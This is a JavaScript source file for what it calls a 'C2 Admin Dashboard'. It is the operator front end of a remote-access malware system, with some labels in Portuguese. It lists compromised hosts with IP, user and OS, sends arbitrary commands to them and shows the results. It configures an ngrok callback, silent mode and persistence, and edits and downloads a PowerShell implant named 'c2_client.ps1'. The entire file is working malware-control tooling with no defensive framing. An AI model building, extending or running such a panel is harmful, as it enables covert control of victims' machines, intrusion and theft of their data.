// C2 Admin Dashboard JavaScript

document.addEventListener('DOMContentLoaded', function() {
    // Helper function to escape HTML
    function escapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    // Helper function to unescape HTML
    function unescapeHtml(str) {
        if (!str) return '';
        return String(str)
            .replace(/&amp;/g, '&')
            .replace(/&lt;/g, '<')
            .replace(/&gt;/g, '>')
            .replace(/&quot;/g, '"')
            .replace(/&#039;/g, "'");
    }

    // Elements cache
    const elements = {
        hostsTableBody: document.getElementById('hosts-table-body'),
        refreshHostsBtn: document.getElementById('refresh-hosts'),
        hostDetails: document.getElementById('host-details'),
        closeDetailsBtn: document.getElementById('close-details'),
        detailHostname: document.getElementById('detail-hostname'),
        detailIp: document.getElementById('detail-ip'),
        detailUsername: document.getElementById('detail-username'),
        detailOs: document.getElementById('detail-os'),
        detailFirstSeen: document.getElementById('detail-first-seen'),
        detailLastSeen: document.getElementById('detail-last-seen'),
        commandInput: document.getElementById('command-input'),
        sendCommandBtn: document.getElementById('send-command'),
        logsContent: document.getElementById('logs-content'),
        errorsContent: document.getElementById('errors-content'),
        configForm: document.getElementById('config-form'),
        ngrokHost: document.getElementById('ngrok-host'),
        ngrokPort: document.getElementById('ngrok-port'),
        retryInterval: document.getElementById('retry-interval'),
        silentMode: document.getElementById('silent-mode'),
        persist: document.getElementById('persist'),
        powershellScript: document.getElementById('powershell-script'),
        saveScriptBtn: document.getElementById('save-script'),
        resetScriptBtn: document.getElementById('reset-script'),
        downloadScriptBtn: document.getElementById('download-script'),
        modalCommand: document.getElementById('modal-command'),
        modalOutput: document.getElementById('modal-output')
    };

    // Initialize Bootstrap elements
    const commandOutputModal = new bootstrap.Modal(document.getElementById('commandOutputModal'));
    
    // Setup tab functionality
    document.querySelectorAll('a[data-bs-toggle="tab"]').forEach(el => {
        el.addEventListener('click', function (e) {
            e.preventDefault();
            const tabTarget = this.getAttribute('href');
            const tabInstance = new bootstrap.Tab(this);
            tabInstance.show();
        });
    });

    // Current selected host
    let currentHostname = null;
    let originalScript = '';

    // Fetch and display hosts
    function fetchHosts() {
        fetch('/api/hosts', {
            credentials: 'same-origin'
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch hosts');
                }
                return response.json();
            })
            .then(hosts => {
                displayHosts(hosts);
            })
            .catch(error => {
                console.error('Error fetching hosts:', error);
                elements.hostsTableBody.innerHTML = `
                    <tr>
                        <td colspan="6" class="text-center text-danger">
                            Error loading hosts. ${error.message}
                        </td>
                    </tr>`;
            });
    }

    // Display hosts in the table
    function displayHosts(hosts) {
        if (Object.keys(hosts).length === 0) {
            elements.hostsTableBody.innerHTML = `
                <tr>
                    <td colspan="6" class="text-center">No hosts connected yet.</td>
                </tr>`;
            return;
        }

        elements.hostsTableBody.innerHTML = '';
        
        Object.entries(hosts).forEach(([hostname, hostData]) => {
            const row = document.createElement('tr');
            const lastSeen = new Date(hostData.last_seen * 1000).toLocaleString();
            
            row.innerHTML = `
                <td>${escapeHtml(hostname)}</td>
                <td>${escapeHtml(hostData.ip)}</td>
                <td>${escapeHtml(hostData.username)}</td>
                <td>${escapeHtml(hostData.os)}</td>
                <td>${lastSeen}</td>
                <td>
                    <button class="btn btn-sm btn-primary view-host" data-hostname="${escapeHtml(hostname)}">
                        <i class="bi bi-eye"></i> View
                    </button>
                </td>
            `;
            
            elements.hostsTableBody.appendChild(row);
        });

        // Add event listeners for View buttons
        document.querySelectorAll('.view-host').forEach(btn => {
            btn.addEventListener('click', function() {
                const hostname = this.getAttribute('data-hostname');
                viewHostDetails(hostname, hosts[hostname]);
            });
        });
    }

    // View host details
    function viewHostDetails(hostname, hostData) {
        currentHostname = hostname;
        
        // Update host details
        elements.detailHostname.textContent = hostname;
        elements.detailIp.textContent = hostData.ip;
        elements.detailUsername.textContent = hostData.username;
        elements.detailOs.textContent = hostData.os;
        elements.detailFirstSeen.textContent = new Date(hostData.first_seen * 1000).toLocaleString();
        elements.detailLastSeen.textContent = new Date(hostData.last_seen * 1000).toLocaleString();
        
        // Show the host details section
        elements.hostDetails.classList.remove('d-none');
        
        // Fetch logs and errors for this host
        fetchHostLogs(hostname);
        fetchHostErrors(hostname);
    }

    // Fetch logs for a host
    function fetchHostLogs(hostname) {
        fetch(`/api/logs/${encodeURIComponent(hostname)}`, {
            credentials: 'same-origin'
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch logs');
                }
                return response.json();
            })
            .then(logs => {
                displayLogs(logs);
            })
            .catch(error => {
                console.error('Error fetching logs:', error);
                elements.logsContent.innerHTML = `<div class="text-danger">Error loading logs: ${error.message}</div>`;
            });
    }

    // Fetch errors for a host
    function fetchHostErrors(hostname) {
        fetch(`/api/errors/${encodeURIComponent(hostname)}`, {
            credentials: 'same-origin'
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch errors');
                }
                return response.json();
            })
            .then(errors => {
                displayErrors(errors);
            })
            .catch(error => {
                console.error('Error fetching errors:', error);
                elements.errorsContent.innerHTML = `<div class="text-danger">Error loading errors: ${error.message}</div>`;
            });
    }

    // Display logs in the logs tab
    function displayLogs(logs) {
        if (logs.length === 0) {
            elements.logsContent.innerHTML = `<div class="text-muted">Nenhum comando executado ainda.</div>`;
            return;
        }

        // Criar um container grid para os logs
        elements.logsContent.innerHTML = '';
        elements.logsContent.className = 'logs-content-grid';
        console.log("Logs recebidos:", logs);
        
        // Filtrar logs para não mostrar mensagens repetidas de "Script atualizado"
        const filteredLogs = logs.filter((log, index, self) => {
            // Se for um log de "Script atualizado", verificar se é repetido
            if (log.data === "Script atualizado.") {
                // Verificar se o último log filtrado não é também "Script atualizado"
                const lastItem = self[index - 1];
                if (lastItem && lastItem.data === "Script atualizado.") {
                    return false;
                }
            }
            return true;
        });
        
        filteredLogs.forEach(log => {
            if (log.command && log.output !== undefined) {
                // Se for saída de comando
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry command-entry';
                
                // Formatação de timestamp
                let timestamp = "";
                if (log.timestamp) {
                    // Verificar se timestamp é número (Unix) ou string (ISO)
                    if (typeof log.timestamp === 'number') {
                        timestamp = new Date(log.timestamp * 1000).toLocaleString();
                    } else if (typeof log.timestamp === 'string') {
                        // Remover possível "PM" ou "AM" e tentar converter
                        const cleanTimestamp = log.timestamp.replace(/\s(AM|PM)$/, '');
                        timestamp = new Date(cleanTimestamp).toLocaleString();
                        
                        // Se ainda for Invalid Date, usar o timestamp original
                        if (timestamp === "Invalid Date") {
                            timestamp = log.timestamp;
                        }
                    }
                }
                
                const output = log.output || "Sem saída do comando";
                
                logEntry.innerHTML = `
                    <div class="log-header">
                        <span class="command-prompt">$ ${escapeHtml(log.command)}</span>
                        <span class="timestamp">${timestamp}</span>
                    </div>
                    ${output.trim() ? `<pre class="command-result">${escapeHtml(output)}</pre>` : '<div class="no-output">Sem saída</div>'}
                `;
                
                elements.logsContent.appendChild(logEntry);
            } else if (log.data && log.data !== "Script atualizado.") {
                // Se for log genérico (exceto "Script atualizado")
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry system-entry';
                
                // Formatação de timestamp
                let timestamp = "";
                if (log.timestamp) {
                    // Verificar se timestamp é número (Unix) ou string (ISO)
                    if (typeof log.timestamp === 'number') {
                        timestamp = new Date(log.timestamp * 1000).toLocaleString();
                    } else if (typeof log.timestamp === 'string') {
                        // Remover possível "PM" ou "AM" e tentar converter
                        const cleanTimestamp = log.timestamp.replace(/\s(AM|PM)$/, '');
                        timestamp = new Date(cleanTimestamp).toLocaleString();
                        
                        // Se ainda for Invalid Date, usar o timestamp original
                        if (timestamp === "Invalid Date") {
                            timestamp = log.timestamp;
                        }
                    }
                }
                
                // Verifica se é um comando executado
                const isExecutingCommand = log.data && log.data.startsWith("Executando comando:");
                if (isExecutingCommand) {
                    const cmdMatch = log.data.match(/Executando comando: (.+)/);
                    const cmdText = cmdMatch ? cmdMatch[1] : "";
                    
                    logEntry.innerHTML = `
                        <div class="log-message command-executing">
                            <span class="system-icon">▶️</span> ${escapeHtml(cmdText)}
                            <span class="timestamp-small">${timestamp}</span>
                        </div>
                    `;
                } else {
                    logEntry.innerHTML = `
                        <div class="log-message">
                            <span class="system-icon">ℹ️</span> ${typeof log.data === 'object' ? JSON.stringify(log.data) : escapeHtml(log.data)}
                            <span class="timestamp-small">${timestamp}</span>
                        </div>
                    `;
                }
                
                elements.logsContent.appendChild(logEntry);
            } else if (log.command) {
                // Se for um comando sem output definido
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry command-entry';
                
                // Formatação de timestamp
                let timestamp = "";
                if (log.timestamp) {
                    // Verificar se timestamp é número (Unix) ou string (ISO)
                    if (typeof log.timestamp === 'number') {
                        timestamp = new Date(log.timestamp * 1000).toLocaleString();
                    } else if (typeof log.timestamp === 'string') {
                        // Remover possível "PM" ou "AM" e tentar converter
                        const cleanTimestamp = log.timestamp.replace(/\s(AM|PM)$/, '');
                        timestamp = new Date(cleanTimestamp).toLocaleString();
                        
                        // Se ainda for Invalid Date, usar o timestamp original
                        if (timestamp === "Invalid Date") {
                            timestamp = log.timestamp;
                        }
                    }
                }
                
                logEntry.innerHTML = `
                    <div class="log-header">
                        <span class="command-prompt">$ ${escapeHtml(log.command)}</span>
                        <span class="timestamp">${timestamp}</span>
                    </div>
                    <div class="no-output">Comando executado, sem saída retornada</div>
                `;
                
                elements.logsContent.appendChild(logEntry);
            }
        });

        // Add event listeners for View Output buttons
        document.querySelectorAll('.view-output').forEach(btn => {
            btn.addEventListener('click', function() {
                const command = unescapeHtml(this.getAttribute('data-command'));
                const output = unescapeHtml(this.getAttribute('data-output'));
                
                elements.modalCommand.textContent = command;
                elements.modalOutput.textContent = output;
                commandOutputModal.show();
            });
        });
    }

    // Display errors in the errors tab
    function displayErrors(errors) {
        if (errors.length === 0) {
            elements.errorsContent.innerHTML = `<div class="text-muted">No errors reported.</div>`;
            return;
        }

        elements.errorsContent.innerHTML = '';
        
        errors.forEach(error => {
            const errorEntry = document.createElement('div');
            errorEntry.className = 'error-entry';
            
            const timestamp = new Date(error.timestamp * 1000).toLocaleString();
            
            errorEntry.innerHTML = `
                <div class="error-header">
                    <span class="timestamp">${timestamp}</span>
                </div>
                <div class="error-message">
                    ${escapeHtml(error.error)}
                </div>
            `;
            
            elements.errorsContent.appendChild(errorEntry);
        });
    }

    // Send command to a host
    function sendCommand() {
        const command = elements.commandInput.value.trim();
        
        if (!command) {
            alert('Please enter a command.');
            return;
        }
        
        if (!currentHostname) {
            alert('No host selected.');
            return;
        }
        
        fetch('/api/send-command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'same-origin',
            body: JSON.stringify({
                hostname: currentHostname,
                command: command
            })
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send command');
                }
                return response.json();
            })
            .then(data => {
                elements.commandInput.value = '';
                alert('Command sent successfully.');
            })
            .catch(error => {
                console.error('Error sending command:', error);
                alert(`Error sending command: ${error.message}`);
            });
    }

    // Fetch and display configuration
    function fetchConfig() {
        fetch('/config')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch configuration');
                }
                return response.json();
            })
            .then(config => {
                elements.ngrokHost.value = config.ngrok_host;
                elements.ngrokPort.value = config.ngrok_port;
                elements.retryInterval.value = config.retry_interval;
                elements.silentMode.checked = config.silent_mode;
                elements.persist.checked = config.persist;
            })
            .catch(error => {
                console.error('Error fetching configuration:', error);
                alert(`Error loading configuration: ${error.message}`);
            });
    }

    // Save configuration
    function saveConfig(event) {
        event.preventDefault();
        
        const config = {
            ngrok_host: elements.ngrokHost.value.trim(),
            ngrok_port: parseInt(elements.ngrokPort.value),
            retry_interval: parseInt(elements.retryInterval.value),
            silent_mode: elements.silentMode.checked,
            persist: elements.persist.checked
        };
        
        fetch('/update-config', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'same-origin',
            body: JSON.stringify(config)
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to update configuration');
                }
                return response.json();
            })
            .then(data => {
                alert('Configuration updated successfully.');
            })
            .catch(error => {
                console.error('Error updating configuration:', error);
                alert(`Error updating configuration: ${error.message}`);
            });
    }

    // Fetch and display PowerShell script
    function fetchPowershellScript() {
        fetch('/script')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to fetch PowerShell script');
                }
                return response.text();
            })
            .then(script => {
                elements.powershellScript.value = script;
                originalScript = script;
            })
            .catch(error => {
                console.error('Error fetching PowerShell script:', error);
                alert(`Error loading PowerShell script: ${error.message}`);
            });
    }

    // Save PowerShell script
    function savePowershellScript() {
        const script = elements.powershellScript.value;
        
        fetch('/upload-script', {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain'
            },
            credentials: 'same-origin',
            body: script
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to update PowerShell script');
                }
                return response.json();
            })
            .then(data => {
                alert('PowerShell script updated successfully.');
                originalScript = script;
            })
            .catch(error => {
                console.error('Error updating PowerShell script:', error);
                alert(`Error updating PowerShell script: ${error.message}`);
            });
    }

    // Reset PowerShell script changes
    function resetPowershellScript() {
        elements.powershellScript.value = originalScript;
    }

    // Download PowerShell script
    function downloadPowershellScript() {
        const script = elements.powershellScript.value;
        const blob = new Blob([script], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = 'c2_client.ps1';
        a.click();
        
        URL.revokeObjectURL(url);
    }

    // Event listeners
    if (elements.refreshHostsBtn) elements.refreshHostsBtn.addEventListener('click', fetchHosts);
    if (elements.closeDetailsBtn) elements.closeDetailsBtn.addEventListener('click', () => {
        elements.hostDetails.classList.add('d-none');
        currentHostname = null;
    });
    if (elements.sendCommandBtn) elements.sendCommandBtn.addEventListener('click', sendCommand);
    if (elements.configForm) elements.configForm.addEventListener('submit', saveConfig);
    if (elements.saveScriptBtn) elements.saveScriptBtn.addEventListener('click', savePowershellScript);
    if (elements.resetScriptBtn) elements.resetScriptBtn.addEventListener('click', resetPowershellScript);
    if (elements.downloadScriptBtn) elements.downloadScriptBtn.addEventListener('click', downloadPowershellScript);

    // Initialize the dashboard
    fetchHosts();
    fetchConfig();
    fetchPowershellScript();
});